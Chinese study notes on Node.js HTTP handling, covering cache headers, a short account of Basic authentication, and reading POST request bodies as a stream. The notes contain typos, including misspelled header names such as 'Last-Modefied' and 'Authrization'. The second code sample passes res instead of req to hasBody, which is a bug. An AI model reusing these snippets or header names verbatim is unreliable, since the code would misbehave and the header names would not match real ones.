通常来说，POST, DELETE, PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存值应用在GET请求中。一般可以通过添加`Expires Cache-Control Etags`来实现缓存

| 服务端 | 客户端 |
| ---    |  ---  |
| Last-Modefied | If-Modefied-Since |
| Etag | If-None-Match |

#### 8.1.7 Basic认证
Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式，这里简要介绍它的原理和它在服务端通过Node处理的流程。  
如果一个页面需要Basic认证，它会检查请求报文中的Authrization字段的内容，该字段的值由认证方式和加密值构成...   
不过Basic认证有很多缺点。

### 8.2 数据上传
上述的内容基本都集中在HTTP请求报文头中，适用于GET请求和大多数其他请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交，文件提交，JSON上传，XML上传等。 

Node的http模块支队HTTP报文的头部进行了解析，然后出发request事件，如果请求中海油内容部分(如POST请求，它具有请求和内容)，内容部分需要用户自行接收和解析，通过报头的`Transfer-Encoding`或`Content-Length`即可判断请求是否带有内容。如下:
```js
var hasBody = function(req) {
  return `transfer-encoding` in req.headers || 'content-length' in req.headers
}
```
在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示:  
```js
function(req, res) {
  if (hasBody(res)) {
    var buffers = []
    req.on('data', function(chunk) {
      buffers.push(chunk)
    })
    req.on('end', function() {
      req.rawBody = Buffer.concat(buffers).toString()
      handle(req, res)
    })
  } else {
    handle(req, res)
  }
}
```
在接收到的Buffer列表转化为一个Buffer对象后，再转换为没有乱码的字符串，暂时挂置在req.rawBody处。

